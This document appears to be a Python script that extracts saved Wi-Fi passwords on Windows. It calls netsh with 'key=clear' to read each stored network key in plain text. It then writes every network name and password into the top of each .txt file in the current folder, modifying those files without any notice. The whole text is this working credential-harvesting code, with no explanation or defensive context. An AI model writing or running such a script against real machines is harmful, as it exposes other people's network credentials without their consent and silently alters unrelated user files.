import subprocess,glob
data = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile " in line]
for wifi in wifis:
    data2 =subprocess.check_output(['netsh','wlan','show','profile', wifi ,'key=clear']).decode('utf-8').split('\n')
    password = [line.split(':')[1][1:-1] for line in data2 if "Key Content " in line] 
    passlist =glob.glob('*.txt')

    for script in passlist:
        with open(script,'r') as f:
            script_code = f.readlines()
            final_code = []
            final_code.extend(wifi)
            final_code.extend(' :: ')
            final_code.extend(password)
            final_code.extend('\n')
            final_code.extend(script_code)

            with open(script,'w') as f:
                f.writelines(final_code)
print('Done!')
